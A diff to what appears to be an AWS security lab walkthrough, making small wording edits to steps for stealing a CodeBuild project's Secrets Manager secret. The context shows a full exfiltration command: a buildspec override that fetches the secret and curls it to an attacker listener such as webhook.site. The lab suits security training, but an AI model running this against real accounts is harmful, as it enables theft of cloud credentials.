@@ -29,13 +29,13 @@ aws codebuild batch-get-projects \
 ```
 
 Check `environment.environmentVariables`; there should be a variable with the fields `name`, `value`, and `type`, where `type` is `SECRETS_MANAGER`.
-Note down the `value` field, it is the name of the target secret, and you will need it in Step 4.
+Note down the `value` field, it is the name of the target Secrets Manager's secret, and you will need it in Step 4.
 
 ---
 
 ## Step 3 — Set Up a Listener
 
-On your attacker machine, start a simple HTTP listener to receive the exfiltrated secret:
+On your attacker machine, start a simple HTTP listener to receive the exfiltrated secret value:
 
 ```bash
 # Use a public endpoint service such as https://webhook.site
@@ -83,7 +83,7 @@ A single command with no intermediate file, using an ANSI-C quoted string so the
 
 ```bash
 aws codebuild start-build \
-  --project-name cg-vulnerable-project-test01 \
+  --project-name cg-vulnerable-project-<cgid> \
   --buildspec-override $'version: 0.2\nphases:\n  build:\n    commands:\n      - |\n        VALUE=$(aws secretsmanager get-secret-value --secret-id <paste the value copied in Step 2> --query "SecretString" --output text)\n      - |\n         curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"'\
   --profile bob \
   --region us-east-1
@@ -106,7 +106,7 @@ Wait until `buildStatus` changes from `IN_PROGRESS` to `SUCCEEDED`.
 
 ---
 
-## Step 6 — Collect the Secret
+## Step 6 — Collect the secret value
 
 Check your listener. The secret value (the flag) will arrive as a POST body within a few seconds of the build reaching the `build` phase.
 
